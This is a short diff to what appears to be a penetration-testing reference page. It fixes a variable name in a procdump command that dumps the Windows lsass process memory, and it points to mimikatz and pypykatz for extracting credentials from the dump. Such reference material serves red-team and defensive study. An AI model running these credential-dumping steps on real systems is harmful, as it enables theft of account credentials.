@@ -74,7 +74,7 @@ Windows Defender is triggered when a memory dump of lsass is operated, quickly l
 tasklist /fi "imagename eq lsass.exe"
 
 # Dump lsass's process memory
-procdump -accepteula -ma $procdump_pid lsass.dmp
+procdump -accepteula -ma $lsass_pid lsass.dmp
 ```
 
 Once the memory dump is finished, it can be analyzed with [mimikatz](https://github.com/gentilkiwi/mimikatz) \(Windows\) or [pypykatz](https://github.com/skelsec/pypykatz) \(Python, cross-platform\).
